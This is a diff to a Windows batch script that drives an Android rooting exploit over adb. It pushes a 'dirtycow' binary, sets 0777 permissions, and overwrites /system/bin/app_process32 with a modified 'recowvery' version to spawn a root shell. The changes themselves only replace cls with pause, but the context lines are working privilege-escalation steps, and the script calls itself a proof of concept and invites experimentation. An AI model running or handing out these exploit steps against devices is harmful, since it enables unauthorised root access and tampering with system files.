@@ -20,7 +20,6 @@ echo [*]
 adb wait-for-device
 adb devices
 pause
-cls
 echo [*] copying dirtycow to /data/local/tmp/dirtycow
 adb push pushed/dirtycow /data/local/tmp/dirtycow
 timeout 2 > nul
@@ -36,7 +35,7 @@ timeout 2 > nul
 echo [*] changing permissions on copied files
 adb shell chmod 0777 /data/local/tmp/*
 timeout 2 > nul
-cls
+pause
 echo --------------------------------------------------------------------------------------------
 echo [*] DONE PUSHING FILES TO PHONE. NOW WE ARE GOING TO TEMP WRITE OVER THE APP_PROCESS
 echo [*] WITH A MODIFIED VERSION THAT HAS lsh IN IT USING A SYSTEM-SERVER AS ROOT SHELL
@@ -45,7 +44,7 @@ echo [*] timeout 15 seconds to read comments
 timeout 15
 adb shell /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/recowvery-app_process32
 echo --------------------------------------------------------------------------------------------
-cls
+pause
 echo --------------------------------------------------------------------------------------------
 echo --------------------------------------------------------------------------------------------
 echo [*]WAITING 60 SECONDS FOR ROOT SHELL TO SPAWN
@@ -62,7 +61,6 @@ echo ---------------------------------------------------------------------------
 echo [*] THERE WAS THE PROOF OF CONCEPT
 echo [*] NOW YOU CAN MODIFY THE cp_comands.txt AND START OVER TO SEE WHAT YOU CAN ACHIVE
 pause
-cls
 echo [*]  
 echo --------------------------------------------------------------------------------------------
 echo --------------------------------------------------------------------------------------------
